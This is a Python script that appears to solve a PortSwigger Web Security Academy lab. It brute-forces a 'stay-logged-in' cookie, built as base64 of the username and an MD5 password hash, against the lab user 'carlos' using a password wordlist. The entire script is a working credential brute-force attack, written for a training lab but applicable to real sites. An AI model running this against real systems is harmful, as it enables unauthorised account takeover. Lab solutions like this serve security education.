# https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie
# stay logged in cookie is base64( 'username:'+md5(password) )
import requests
from base64 import b64encode
from hashlib import md5

url = 'https://ac0c1fc61e98e15380417c61006e0068.web-security-academy.net/'
target_username = 'carlos'
passwords_wordlist = './passwords.txt'

# open passwords wordlist
with open(passwords_wordlist, 'r') as f:
    # iterate over lines in file
    for line in f:
        # use line as password with whitespaces stripped
        password = line.strip()
        # if password is empty string, skip
        if not password:
            continue

        print('trying cookie based on password %s' % password)

        # make password hash
        password_hash = md5(bytes(password.encode('utf-8'))).hexdigest()

        # build base64 cookie value
        stay_logged_in_cookie_value = b64encode(
            bytes(('%s:%s' % (target_username, password_hash)).encode('utf-8'))).decode('utf-8')

        # build cookies dict
        cookies = {'stay-logged-in': stay_logged_in_cookie_value}

        # do request using cookies and check if logged in
        request_response = requests.get(url, cookies=cookies)

        if 'My account' in request_response.text:
            print('logged in')
            print('cookies %s' % request_response.cookies.get_dict())
            exit()

print('login fail')
